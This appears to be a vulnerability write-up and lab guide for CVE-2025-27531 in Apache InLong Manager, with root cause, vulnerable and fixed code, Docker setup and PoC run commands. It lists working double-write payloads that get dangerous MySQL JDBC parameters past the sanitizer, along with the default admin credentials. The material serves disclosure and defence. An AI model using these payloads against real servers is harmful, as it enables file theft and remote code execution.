# CVE-2025-27531 - Apache InLong Manager JDBC URL Sanitization Bypass

> **Exploit Intelligence Platform** | [exploit-intel.com](https://exploit-intel.com) | [@exploit_intel](https://x.com/exploit_intel)

## Vulnerability Summary

| Field | Value |
|---|---|
| CVE | CVE-2025-27531 |
| Component | [Apache InLong Manager](https://github.com/apache/inlong) |
| Type | CWE-502: Deserialization of Untrusted Data |
| CVSS | 9.8 (Critical) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| EPSS | 0.5% (65.0th percentile) |
| Affected | 1.13.0 <= version < 2.1.0 |
| Fix | Iterative `while` loop sanitizer in v2.1.0 (commit `ebcd6d3`) |
| Author | Exploit Intelligence Platform |
| Date | 2026-03-01 |

## Vulnerability Details

CVE-2025-27531 is a **critical** JDBC URL sanitization bypass vulnerability in Apache InLong Manager versions 1.13.0 through 2.0.0. The `MySQLSensitiveUrlUtils.filterSensitive()` method uses a **single-pass `for` loop** to remove dangerous MySQL JDBC connection parameters. An authenticated attacker can use a **double-write (nesting) technique** to inject dangerous parameters (`autoDeserialize`, `allowLoadLocalInfile`, `allowUrlInLocalInfile`) past the blocklist filter, enabling **arbitrary file read** from the server and **remote code execution** via Java deserialization through a rogue MySQL server.

> **Note:** The NVD vector rates privileges as PR:N, but exploitation requires authentication to the InLong Manager REST API. Default credentials (`admin`/`inlong`) are widely known.

## Root Cause

The vulnerability resides in `MySQLSensitiveUrlUtils.filterSensitive()` within the `inlong-manager/manager-pojo` module. The sanitizer uses `StringUtils.replaceIgnoreCase()` in a **single-pass `for` loop** to remove substrings matching `<sensitive_key>=true` and `<sensitive_key>=yes`:

```java
// Vulnerable code — MySQLSensitiveUrlUtils.java lines 74-79 (v2.0.0)
for (String key : SENSITIVE_REPLACE_PARAM_MAP.keySet()) {
    resultUrl = StringUtils.replaceIgnoreCase(resultUrl, key + "=" + "true", "");
    resultUrl = StringUtils.replaceIgnoreCase(resultUrl, key + "=" + "yes", "");
}
```

Because only **one pass** is made per key, an attacker can embed a sensitive parameter name **within itself** (double-write). When the sanitizer removes the inner occurrence, the outer fragments reassemble the dangerous parameter:

```
Input:   allowLoadallowLoadLocalInfile=trueLocalInfile=true
                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                  inner match removed by sanitizer

After:   allowLoadLocalInfile=true   ← dangerous param survives!
```

A secondary defense parses `?key=value` query strings, but it only activates for URLs containing `?`. Using MySQL Connector/J's **address-list format** (`jdbc:mysql://address=(host=H)(port=P)(prop=val)`) bypasses this defense entirely.

## Lab Setup

### Prerequisites

- Docker Engine with Compose plugin
- ~2 GB disk space (Docker images)

### Quick Start

```bash
cd CVE-2025-27531

# Build and start
docker compose build
docker compose up -d

# Run the exploit
python3 poc/poc.py localhost 8083

# Cleanup
docker compose down -v
```

> **Note:** First startup may take 1-2 minutes for MySQL schema initialization.

### Container Details

| Container | Image | Role | Port |
|-----------|-------|------|------|
| `cve-2025-27531-mysql` | Custom (`mysql:8.0.28` + InLong schema) | Backend database | 3306 (internal) |
| `cve-2025-27531-manager` | Custom (`inlong/manager:2.0.0` + bind fix) | Vulnerable InLong Manager REST API | 8083 |

### Credentials

| Service | Username | Password |
|---------|----------|----------|
| InLong Manager | `admin` | `inlong` |
| MySQL | `root` | `inlong` |

### Verify the Lab

```bash
# Check containers are running
docker compose ps

# Test authentication
curl -s -X POST "http://localhost:8083/inlong/manager/api/anno/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"inlong"}'
# Expected: {"success":true,"errMsg":null,"data":true}
```

### Stop the Lab

```bash
docker compose down

# Full reset (remove volumes)
docker compose down -v
```

## PoC Usage

Three PoC scripts are provided, each demonstrating a different attack vector. All scripts use Python 3 stdlib only (no external dependencies).

### Vector 1: Sink Save Endpoint — `poc/poc.py`

Primary PoC — demonstrates all three sensitive parameter bypasses via `POST /api/sink/save`.

```bash
python3 poc/poc.py localhost 8083
```

**What it does:**
1. Authenticates as `admin`/`inlong`
2. Creates an InLong group and stream (required for sink creation)
3. Creates MySQL sinks with double-write payloads for each sensitive parameter
4. Retrieves the stored sinks and verifies the dangerous parameters survived sanitization

### Vector 2: Node Save Endpoint — `poc/poc_vector2.py`

Alternative vector via `POST /api/node/save` — does **not** require pre-existing InLong groups or streams.

```bash
python3 poc/poc_vector2.py localhost 8083
```

### Vector 3: Combined Multi-Parameter + Sanitizer Simulation — `poc/poc_vector3.py`

Two-part PoC: Python simulation of the vulnerable vs. fixed sanitizer logic, plus live combined multi-parameter and triple-nested bypass tests.

```bash
python3 poc/poc_vector3.py localhost 8083
```

## Verification

### Vulnerable (v2.0.0) — Bypass Succeeds

| Test | Result | Evidence |
|------|--------|----------|
| `allowLoadLocalInfile` double-write (sink endpoint) | **Bypass confirmed** | Dangerous parameter survived in stored JDBC URL |
| `autoDeserialize` double-write (sink endpoint) | **Bypass confirmed** | Dangerous parameter survived in stored JDBC URL |
| `allowUrlInLocalInfile` double-write (sink endpoint) | **Bypass confirmed** | Dangerous parameter survived in stored JDBC URL |
| Node save endpoint bypass | **Bypass confirmed** | Same double-write works via `/api/node/save` |
| Combined multi-parameter | **Bypass confirmed** | Both `allowLoadLocalInfile` + `autoDeserialize` survive in single URL |
| Triple-nested bypass | **Bypass confirmed** | Multi-layer nesting defeats single-pass sanitizer |

### Bypassed Parameters

| Parameter | Double-Write Payload | Impact |
|-----------|---------------------|--------|
| `allowLoadLocalInfile` | `allowLoadallowLoadLocalInfile=trueLocalInfile=true` | Arbitrary file read via rogue MySQL `LOAD DATA LOCAL INFILE` |
| `autoDeserialize` | `autoDeautoDeserialize=trueserialize=true` | Remote code execution via Java deserialization |
| `allowUrlInLocalInfile` | `allowUrlInallowUrlInLocalInfile=trueLocalInfile=true` | URL-based file loading via `LOAD DATA LOCAL INFILE` |

## Fix

### Commit [`ebcd6d3`](https://github.com/apache/inlong/commit/ebcd6d3230b73abdc41edb93619be2a26c9b8c97) (v2.1.0)

Replaced the single-pass `for` loop with an iterative `while` loop that continues removing sensitive parameters until none remain:

```java
// Fixed code
String sensitiveKey = containSensitiveKey(resultUrl);
while (StringUtils.isNotBlank(sensitiveKey)) {
    resultUrl = StringUtils.replaceIgnoreCase(resultUrl, sensitiveKey + "=" + "true", "");
    resultUrl = StringUtils.replaceIgnoreCase(resultUrl, sensitiveKey + "=" + "yes", "");
    sensitiveKey = containSensitiveKey(resultUrl);
}
```

A follow-up commit ([`86c893c`](https://github.com/apache/inlong/commit/86c893cfd8f7ba9ffce5d20abef6cd360f502fdf)) also fixed case-sensitivity in the `containSensitiveKey()` helper.

## References

| Resource | URL |
|----------|-----|
| **NVD Entry** | https://nvd.nist.gov/vuln/detail/CVE-2025-27531 |
| **GHSA Advisory** | https://github.com/advisories/GHSA-62gc-8jr5-x9pm |
| **Apache Mailing List** | https://lists.apache.org/thread/r62lkqrr739wvcb60j6q63rh4bxx5 |
| **Fix PR** | https://github.com/apache/inlong/pull/11586 |
| **Fix Commit (v2.1.0)** | https://github.com/apache/inlong/commit/ebcd6d3230b73abdc41edb93619be2a26c9b8c97 |
| **CWE-502** | https://cwe.mitre.org/data/definitions/502.html |

## Disclaimer

This proof-of-concept is provided for **authorized security testing and educational purposes only**. It is intended to help defenders understand, detect, and remediate CVE-2025-27531 in their environments.

**Do not** use this tool against systems you do not own or have explicit written authorization to test. Unauthorized access to computer systems is illegal in most jurisdictions and may violate laws including the Computer Fraud and Abuse Act (CFAA), the Computer Misuse Act, and equivalent legislation worldwide.

The authors assume no liability for misuse of this material. This project follows responsible disclosure practices.
